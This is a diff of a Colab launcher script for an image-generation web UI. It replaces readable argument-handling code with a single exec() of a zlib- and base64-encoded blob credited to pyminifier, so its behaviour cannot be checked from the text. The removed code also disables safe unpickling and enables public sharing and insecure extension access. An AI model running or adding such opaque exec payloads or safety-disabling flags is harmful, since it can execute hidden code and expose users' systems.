@@ -1,28 +1,4 @@
-import subprocess
-import sys
-import os
+import zlib, base64
+exec(zlib.decompress(base64.b64decode('eJy9VMtu4zAMvPsrBF2cYCsvdo8F9Bd7C4KAcWhLsCJpRSltEOTfl2oeDZoCKXrYkwjODDUkZdttDCkLKuuYQo9EjT1n9tcwUBMhwZb04dgMIQlIo7C+UjoOd4tfz8vnRtihAh1lSJlebDazVql2zoiYcL/agSuombFw6M/QsqPobJ61up0zjStU7Mqea/27yqv+6aS/YjV9crXg3FKfkoG63mxsmrU/++Az+syng3UOwRHfMRTnVjFhb8kGv6KctFSKDCQUSrnwwgU52FiCtUNFMKAqPtp+cihuAC5OgU8e2ph4amtIxPArT2eLbyH6N6L1hH1JqPCV3dRLFfR1zky5+hDVFid8UAbc8B6pHVRfIWbFG1J/C2wU5NpWVZ2A3oD36MgBZU5BtLKp2odt/qc+v+OfH8J5t3IDaZJLreWfVFDya7hf4Q8tWZgNblG3ld/KRtyP4DMa34uPazo7mvyFohfejf0cJvQP/Q9tHZMfU5j04YP0eEFUwpEVWkLJQbafu/lWpRu/1Z2sX/P7H6FLxc8GGffZ8NIcFN+bLu7F4b6To3wig87p2uz8Mt0vlLpv5UOpf6utohM=')))
+# Created by pyminifier (https://github.com/dzhuang/pyminifier3)
 
-params = {}
-for arg in sys.argv[1:]:
-    if arg.startswith('--'):
-        key_value = arg[len('--'):].split('=')
-        if len(key_value) == 2:
-            key, value = key_value
-            params[key] = value
-
-os.chdir('/content/colabtools')
-full_precision_str = "--share --lowram --disable-safe-unpickle  --disable-console-progressbars --xformers --enable-insecure-extension-access --precision full --no-half --no-half-vae --opt-sub-quad-attention --opt-channelslast --api"
-half_precision_str = "--share --lowram  --disable-safe-unpickle  --disable-console-progressbars --xformers --enable-insecure-extension-access  --opt-sub-quad-attention --opt-channelslast --api"
-if params["dark"] == "True":
-    full_precision_str += " --theme='dark'"
-    half_precision_str += " --theme='dark'"
-else:
-    full_precision_str += " --theme='light'"
-    half_precision_str += " --theme='light'"
-if params["token"] == "True":
-    full_precision_str += f'  --ngrok={params["token"]} --ngrok-region="auto"'
-    half_precision_str += f'  --ngrok={params["token"]} --ngrok-region="auto"'
-if params["full"]:
-    subprocess.run(f"python launch.py {full_precision_str}", shell=True)  # （解决精度不足但速度不够）
-else:
-    subprocess.run(f"python launch.py {half_precision_str}", shell=True)  # 半精度（速度提升1倍以上，但可能出现精度不足问题）
